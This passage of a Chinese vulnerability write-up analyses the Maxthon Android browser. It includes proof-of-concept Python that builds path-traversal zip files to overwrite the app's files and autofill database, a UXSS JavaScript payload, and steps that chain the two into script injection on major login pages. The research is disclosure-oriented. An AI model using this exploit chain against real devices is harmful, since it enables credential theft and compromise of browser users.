                v4_1.close();
                v5.close();
                goto label_20;
            }
            catch(IOException v0) {
                System.out.println("IOError :" + v0);
            }
        }
这时，我停止了逆向这个方法，因为很明显加载到浏览器中的恶意网页可能会使应用程序下载并解压放在攻击者服务器上的 zip 文件。而且由于缺少对 zip
每条文件名的输入验证，我们可以穿越路径来覆盖浏览器可以访问到的任意文件。
### 利用任意文件写入漏洞第一部分 - 一个简单的 PoC
首先，我们需要使用以下 Python 代码构建恶意 zip 文件。 此处仅供参考，这里假设 `/sdcard/` 已经软链接至
`/storage/emulated/legacy/` 目录。最后 ，浏览器将 `maxFileWriteTest.txt` 写入到
`/storage/emulated/legacy/webapp/maxFileWriteTest9843/../../../data/data/com.mx.browser/maxFileWriteTest.txt`
文件, 相当于`/data/data/com.mx.browser/maxFileWriteTest.txt`。
    import zipfile
    import sys
    if __name__ == "__main__":
        try:
            with open("maxFileWriteTest.txt", "r") as f:
                binary = f.read()
                zipFile = zipfile.ZipFile("maxFileWriteTest9843.zip", "a", zipfile.ZIP_DEFLATED)
                info = zipfile.ZipInfo("maxFileWriteTest9843.zip")
                zipFile.writestr("../../../../../data/data/com.mx.browser/files/maxFileWriteTest.txt", binary)
                zipFile.close()
        except IOError as e:
            raise e
然后我们使用 `unzip` 命令列出归档文件，以验证是否正确创建了 zip 文件。看起来效果不错。
    $ unzip -l maxFileWriteTest9843.zip
    Archive:  maxFileWriteTest9843.zip
      Length     Date   Time    Name
     --------    ----   ----    ----            4  02-11-16 15:38   ../../../../../data/data/com.mx.browser/files/maxFileWriteTest.txt
     --------                   -------            4                   1 file
Ok，现在构建的恶意页面，强行让浏览器使用 `installWebApp`方法下载并解压了我们的文件。
当浏览器访问恶意页面时，“webapp” 会自动安装。检查 `/data/data/com.mx.browser/files`
目录，显然我们可以将任意文件写入浏览器的应用程序目录。对受害者来说，唯一可能会察觉的迹象是一个弹出状态信息，告诉用户 “webapp installed”。
—— 文件写入 `/data/data/com.mx.browser/files` 路径。
### 寻找登录页面的 UXSS 漏洞
构建这个漏洞页面所需的就是将包含目标 URL，用户名和密码的 JSON payload 传递给 `mxautofill` 的 `catchform`
方法，如下面的 HTML 和 JavaScript 代码所示。
当用户访问恶意页面时，系统会提示用户“save your account?”，并且用户必须点击 ”Yes“
，浏览器才回保存自动填充信息。用户授权时会把它当做当前域的自动填充信息，而不是在其他任何域下。
—— 受害者被提示”Save your account？“
下次受害者访问 Google 登录页面时，浏览器通过 `com.mx.browser.a.e` 类中的 WebView 的 `loadUrl` 方法将以下
JavaScript 插入到页面中。
`javascript:mx_form_fill('PI:EMAIL' ,
'fakepassword'-alert('LoginUXSS:'+document.domain)-'')`
然后在 accounts.goolge.com 的页面会显示弹出窗口信息。
—— 我们的 JavaScript 在 Google 的登录页面得以执行
### 任意文件写入二 —— 覆盖数据库以便不需要用户交互即可触发 UXSS
通常利用登录页面进行 UXSS 需要一些用户交互，因为受害者需要对”save your account？“ 提示弹窗点击
”Yes“，但是鉴于存在任意文件写入漏洞，我们可以配合漏洞在没有用户交互的情况下施展攻击链，参考以下步骤。
1） 创建包含多个主流域名的自动填充信息的 SQLite 数据库（`mxbrowser_default.db`）。同样地，我们将在用户名字段注入我们的
JavaScript 代码。
2） 创建一个 zip 文件，利用目录穿越来覆盖浏览器的 SQLite 数据库（`mxbrowser_default.db`）。
3）欺骗受害者浏览器浏览到能够触发 `installWebApp` 方法的恶意页面，这会让受害者的浏览器自动下载并解压缩我们的 zip 文件。此时，受害者的
SQLite 数据库将替换为我们制作的数据库。
4） 下一次受害者访问其中一个域名的登录页面时，我们的 JavaScript 代码将会注入到页面中。
我仅从我的设备（`/data/data/com.mx.browser/databases/mxbrowser_default.db`）中提取出相关的
SQLite 数据库，并使用 SQLite 客户端修改了 mxautofill 表。
\-- 在多个域名的用户名字段中包含了 XSS payload 恶意 SQLite 数据库
我们可以使用以下 Python 代码来构建 zip 文件，
    import zipfile
    import sys
    if __name__ == "__main__":
        try:
            with open("mxbrowser_default.db", "r") as f:
                binary = f.read()
                zipFile = zipfile.ZipFile("maxFileWriteToLoginUXSS6324.zip", "a", zipfile.ZIP_DEFLATED)
                zipFile.writestr("../../../../../data/data/com.mx.browser/databases/mxbrowser_default.db", binary)
                zipFile.close()
        except IOError as e:
            raise e
然后我们制作调用了 `installWebApp` 方法的 HTML 页面。
此时如果受害者使用傲游浏览器访问恶意页面，那么他们的本地 SQLite 数据库将被我们制作的数据库覆盖，当当受害者访问 Yahoo ，Twitter 或者
Google 登录页面时，我们的 JavaScript 代码将执行。
—— 受害者访问恶意网页，并自动安装”webapp“。此时受害者的本地数据库已被覆盖。
—— 我们的 JavaScript 代码在 Google 的登录页面再一次执行。
未完，下篇见：http://paper.seebug.org/109/
* * *